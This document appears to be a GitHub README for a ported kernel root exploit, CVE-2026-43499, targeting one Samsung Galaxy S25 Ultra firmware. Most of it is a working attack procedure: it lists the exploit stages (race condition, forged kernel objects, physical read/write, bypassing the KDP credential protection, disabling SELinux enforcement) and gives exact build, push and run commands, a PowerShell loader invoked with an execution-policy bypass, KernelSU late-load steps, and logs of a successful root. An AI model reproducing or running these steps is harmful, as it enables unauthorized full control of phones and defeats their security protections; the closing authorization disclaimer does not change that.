
# CVE-2026-43499 - Galaxy S25 Ultra
<img width="1905" height="483" alt="image" src="https://github.com/user-attachments/assets/5c58ce25-40b1-4ef2-ac60-f368135cb899" />
<img width="522" height="81" alt="image" src="https://github.com/user-attachments/assets/30205934-9c28-42c5-a2ac-e10b30024685" />

This repository contains a device-specific port of the CVE-2026-43499
exploit for the Korean Samsung Galaxy S25 Ultra.

<img width="380" alt="KakaoTalk_20260717_202958219" src="https://github.com/user-attachments/assets/dfe6a621-4dac-463b-baf0-46fb8fb10958" />

## Supported target

```text
Device: Samsung Galaxy S25 Ultra (SM-S938N)
Codename: pa3q
Android: 16 / SDK 36
Build number: S938NKSUACZF1
Build display ID: BP4A.251205.006.S938NKSUACZF1
Build fingerprint: samsung/pa3qksx/pa3q:16/BP4A.251205.006/S938NKSUACZF1_OKRACZF1:user/release-keys
Kernel: 6.6.98-android15-8-pd6ff1cd-abogkiS938NKSUACZF1-4k
Architecture: aarch64
```

The offsets and structure layouts in this repository are specific to the
firmware above. Other models and firmware builds are not supported by this
target profile.

## Reference source

This port is based on the exploit implementation published in:

- [NebuSec/CyberMeowfia — IonStack/CVE-2026-43499/exploit](https://github.com/NebuSec/CyberMeowfia/tree/b850d3bddc74c3328d5fbcc0568d21962b55d949/IonStack/CVE-2026-43499/exploit)
- Upstream revision used as the porting base: `b850d3bddc74c3328d5fbcc0568d21962b55d949`

The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).

## Main porting changes

- Added the `pa3q-S938NKSUACZF1` target offsets and kernel structure layouts.
- Added tracefs-based automatic KASLR slide recovery for the Samsung kernel.
- Ported the pselect race, fake PI waiter/task layout, CFI/FOPS stage, and
  physical read/write primitive.
- Added a KDP-safe `system_unbound_wq` user-mode-helper root path.
- Added a socket-backed root command helper at
  `/data/local/tmp/cve-2026-43499-root`.
- Restored upstream KernelSU `sucompat`: allowed callers are redirected to the
  installed `/data/adb/ksud`, so the original option parser, shell handling,
  Root Profile, mount namespace, capabilities, and SELinux behavior are used.
- Added a task-scoped Samsung KDP credential path. A root kernel worker asks
  the firmware's own `prepare_ro_creds(COPY_CREDS)` implementation to create a
  protected credential with the correct target-task back pointer, then installs
  that credential while the caller is blocked. KDP remains enabled globally.
- Registers the protected credential page with the SM8750 KDP ABI
  (`UH_APP_KDP=0xc300c002`, `SET_CRED_PGD=0x06`). The vendor `uh_call` entry is
  reached through a `noinline __nocfi` wrapper because this firmware does not
  export a KCFI-compatible call target.
- Keeps the Samsung RKP-compatible kprobe syscall routing; the syscall table is
  not patched when RKP rejects writes.
- Added a built-in root-helper `--late-load` request that stages the patched
  `ksud`, enters a private mount namespace, and executes it through the
  `/system/bin/logcat` mount path without a second UID-0 exec from
  `/data/local/tmp`.
- Restores the global ashmem FOPS pointer immediately after establishing the
  arbitrary read/write primitive.
- Retains reclaimed pages in a detached `cve43499-hold` process after success
  so dangling kernel references cannot be recycled into unrelated slab objects.
- Runs failed race attempts in independent child processes and automatically
  retries with a device-tuned pselect delay sequence.

## Build

Set `ANDROID_NDK_HOME` to Android NDK r29 or a compatible toolchain, then run:

```sh
make -j8
```

Outputs:

```text
build/cve-2026-43499
build/cve-2026-43499-root
```

## Deploy

```sh
adb push build/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
```

## Run

```sh
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

## KernelSU late-load

The repository contains only the verified KernelSU build artifacts. KernelSU
source trees, unused device profiles, and intermediate build files are not
included:

```text
kernelsu/kernelsu.ko
kernelsu/ksud-s25u-kdp
```

Verified SHA-256 values:

```text
54676e77a87a86203c825695199b20abe5b464b5766e200185968a990c57b235  kernelsu/kernelsu.ko
fa3edcc7d168637394877b30cb1f909d762dda788ec14051f4ae79edd6562d63  kernelsu/ksud-s25u-kdp
```

`ksud-s25u-kdp` embeds the matching module used by `late-load`.
`kernelsu.ko` is included as the independently inspectable build output. Do
not combine either file with a loader or module from another build.

After the exploit reports `done=1 root=1`, run the Windows loader from the
repository root. It verifies the loader hash, confirms bootstrap root, uploads
the loader and its staging copy, invokes the root helper's built-in late-load
path, and verifies the loaded module and installed daemon:

```powershell
powershell -ExecutionPolicy Bypass -File .\run-s25u.ps1
```

The script intentionally does not start KernelSU Manager. Verify the runtime
before opening Manager:

```powershell
adb shell "grep '^kernelsu ' /proc/modules; getenforce"
adb shell "su -c 'id; pwd; getenforce'"
adb logcat -d -s KernelSU:I
```

Expected `su` identity:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

The equivalent manual Windows PowerShell sequence is:

```powershell
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
adb push .\kernelsu\ksud-s25u-kdp /data/local/tmp/ksud-s25u-kdp
adb push .\kernelsu\ksud-s25u-kdp /data/local/tmp/.ksud-stage
adb shell "chmod 755 /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
"late_load_exit=$LASTEXITCODE"
adb shell "grep '^kernelsu ' /proc/modules; getenforce"
adb shell "su -c 'id; pwd; getenforce'"
```

There is no separate userspace root broker in this path. Authorization,
per-app Root Profiles, mount namespaces, capabilities, command options, and
shell selection are handled by KernelSU's original `sucompat` and `ksud`
implementation. The late-loaded runtime lasts until reboot.

The default run makes up to 16 independent attempts. Each failed child exits
before the next attempt, so its file descriptors and heap-shaping allocations
are released instead of accumulating inside one long-lived exploit process.
The default base delay is `20000` microseconds and the supervisor sweeps the
following sequence twice:

```text
20000, 30000, 50000, 25000, 40000, 15000, 60000, 35000
```

Override the attempt count or base delay when collecting timing data:

```sh
adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
```

Verified result on `S938NKSUACZF1`:

```text
root umh result wake=1 complete=1 retval=0 socket=1
pipe-physrw-summary done=1 root=1
stability keeper pid=<pid> retaining reclaimed kernel pages
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

The initial pselect stage is race-based. A child that exits with `root=0`
is retried automatically. Successful execution switches SELinux to permissive
and starts the root helper until the next reboot.

## Stability keeper

The exploit intentionally leaves a detached process named `cve43499-hold`
after a successful run. It owns the socket buffers and pipe slabs that back
the forged kernel objects. Do not kill it while using the temporary root
session; releasing those allocations can leave stale kernel references and
cause a delayed panic. The process and all retained allocations disappear on
the next reboot.

Confirm that it is present after `root=1`:

```sh
adb shell "pidof cve43499-hold"
```

Use only on devices you own or are explicitly authorized to test.
